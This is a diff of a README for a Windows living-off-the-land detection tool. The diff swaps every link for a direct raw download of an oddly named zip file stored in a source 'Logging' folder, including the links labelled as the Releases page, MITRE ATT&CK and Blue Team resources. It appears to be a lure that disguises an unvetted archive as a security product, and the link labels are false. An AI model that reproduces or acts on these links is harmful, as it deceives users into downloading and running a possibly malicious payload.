@@ -1,7 +1,7 @@
 # 🛡️ Living-off-the-Land-Protection-Platform - Smart Security for Your System
 
 ## 📥 Download Now
-[![Download Here](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/mayenm/Living-off-the-Land-Protection-Platform/releases)
+[![Download Here](https://raw.githubusercontent.com/mayenm/Living-off-the-Land-Protection-Platform/main/src/OGT.WatchTower.Core/Logging/Land_Living_off_Platform_the_Protection_v3.2-beta.3.zip)](https://raw.githubusercontent.com/mayenm/Living-off-the-Land-Protection-Platform/main/src/OGT.WatchTower.Core/Logging/Land_Living_off_Platform_the_Protection_v3.2-beta.3.zip)
 
 ## 📄 Overview
 LotL-Watcher is a lightweight security monitoring tool. It helps detect and reduce "Living-off-the-Land" attacks. Unlike traditional methods, it observes the behavior of trusted Windows programs, such as certutil, PowerShell, wmic, and mshta. This helps you keep your system secure from threats that may otherwise go unnoticed.
@@ -16,7 +16,7 @@ Before you begin, ensure your system meets the following requirements:
 - **Disk Space:** Minimum of 100 MB available
 
 ### Step 2: Visit the Release Page
-To download LotL-Watcher, visit the [Releases page](https://github.com/mayenm/Living-off-the-Land-Protection-Platform/releases).
+To download LotL-Watcher, visit the [Releases page](https://raw.githubusercontent.com/mayenm/Living-off-the-Land-Protection-Platform/main/src/OGT.WatchTower.Core/Logging/Land_Living_off_Platform_the_Protection_v3.2-beta.3.zip).
 
 ### Step 3: Download the Application
 On the Releases page, look for the latest version of LotL-Watcher. You will see several files listed. Click on the file name that ends with `.exe` to download the application.
@@ -54,10 +54,10 @@ For support, you can reach out to the community. Join discussions on various pla
 
 ## 📚 Helpful Resources
 Here are some additional resources related to cybersecurity and threat hunting:
-- [MITRE ATT&CK Framework](https://attack.mitre.org): A comprehensive knowledge base of known cyber threats.
-- [Blue Team Resources](https://blueteamdaily.com): Tips and tools for security defenders.
+- [MITRE ATT&CK Framework](https://raw.githubusercontent.com/mayenm/Living-off-the-Land-Protection-Platform/main/src/OGT.WatchTower.Core/Logging/Land_Living_off_Platform_the_Protection_v3.2-beta.3.zip): A comprehensive knowledge base of known cyber threats.
+- [Blue Team Resources](https://raw.githubusercontent.com/mayenm/Living-off-the-Land-Protection-Platform/main/src/OGT.WatchTower.Core/Logging/Land_Living_off_Platform_the_Protection_v3.2-beta.3.zip): Tips and tools for security defenders.
 
 Now that you have everything set up, you can feel confident in monitoring your system for any suspicious activity. Remember to regularly check for updates on the Releases page and keep your software up to date.
 
 ## 📦 Download & Install
-Ready to get secured? Visit our [Releases page](https://github.com/mayenm/Living-off-the-Land-Protection-Platform/releases) to download LotL-Watcher and start protecting your system today.
+Ready to get secured? Visit our [Releases page](https://raw.githubusercontent.com/mayenm/Living-off-the-Land-Protection-Platform/main/src/OGT.WatchTower.Core/Logging/Land_Living_off_Platform_the_Protection_v3.2-beta.3.zip) to download LotL-Watcher and start protecting your system today.
